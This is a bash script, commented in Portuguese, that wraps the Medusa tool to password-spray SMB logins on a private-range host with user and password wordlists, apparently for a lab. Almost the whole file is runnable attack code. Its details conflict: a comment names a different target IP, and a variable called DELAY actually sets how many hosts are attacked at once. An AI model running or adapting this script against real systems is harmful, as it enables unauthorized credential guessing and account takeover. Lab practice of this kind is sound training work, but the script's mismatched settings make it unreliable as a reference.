#!/usr/bin/env bash
# medusa_smb.sh
# Password spraying em SMB com Medusa — ambiente de laboratório.
#
# Comando usado:
#   medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

set -euo pipefail

TARGET="192.168.56.102"
USERS="wordlists/smb_users.txt"
PASSWORDS="wordlists/senhas_spray.txt"
THREADS=2
DELAY=50

echo "=== Password Spraying em SMB (Medusa) ==="
echo "Host: $TARGET | Usuários: $USERS | Senhas: $PASSWORDS"
echo "Threads: $THREADS"

if [ ! -f "$USERS" ]; then
  echo "ERRO: smb_users.txt não encontrado"
  exit 1
fi
if [ ! -f "$PASSWORDS" ]; then
  echo "ERRO: senhas_spray.txt não encontrado"
  exit 1
fi

# Comando executado:
#   medusa -h 192.168.56.191 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
# Executando Medusa...
echo "Executando Medusa..."
# -t: logins simultâneos | -T: hosts simultâneos; não define uma pausa entre tentativas.
sudo medusa -h "$TARGET" -U "$USERS" -P "$PASSWORDS" -M smbnt -t "$THREADS" -T "$DELAY"

echo ""
echo "=== Conclusão ==="
